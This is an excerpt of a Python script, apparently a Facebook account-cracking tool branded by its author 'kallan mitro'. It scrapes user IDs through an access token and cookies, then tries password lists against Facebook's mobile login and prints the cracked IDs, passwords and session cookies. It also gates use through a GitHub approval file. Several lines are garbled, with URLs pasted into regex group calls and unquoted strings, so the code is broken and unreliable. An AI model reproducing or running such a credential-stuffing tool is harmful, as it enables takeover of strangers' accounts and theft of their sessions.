...
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • kallan mitro
╠══[Facebook                 • https://www.facebook.com/profile.php?id=100086270594350
╠══[Github                   • \33[1;38m kallan mitro ]   ║\33[1;34m   
╠══[Whatsapp                 • 
╠══[TOOLS                    • free  ]        ║ \33[1;32m   
...
def login():
	banner()
	kallanj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	kallanj('\033[0;97m===============================================')
	kallan= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if kallan in ['m']:
		public()
	elif kallan in ['1']:
		crack_file()
		...
		os.system('xdg-openhttps://facebook.com/groups/611206677798030/ )
	elif kallan in ['0']:
...
def public():
	...
	for userr in uid:
		try:
			col = ses.get(https://facebook.com/groups/611206677798030//v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[kallan-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			dataa ={"lsd":re.search('name="kallan" value="(.*?)"', str(p.text)).group(https://facebook.com/groups/611206677798030/),"kallan":re.search('name="kallan" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#kallan
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•kallan-Cp] {idf} • {pw}')     
				...
				#kallan mitro
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•kallan-Ok💚] {idf} • {pw}\n\033[0;93m[🤯🤫]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " kallan,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/8kallan /Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		os.system('am start https://wa.me/+01613950781?text=' + tks)
		Subscraption() 
Subscraption() 
login()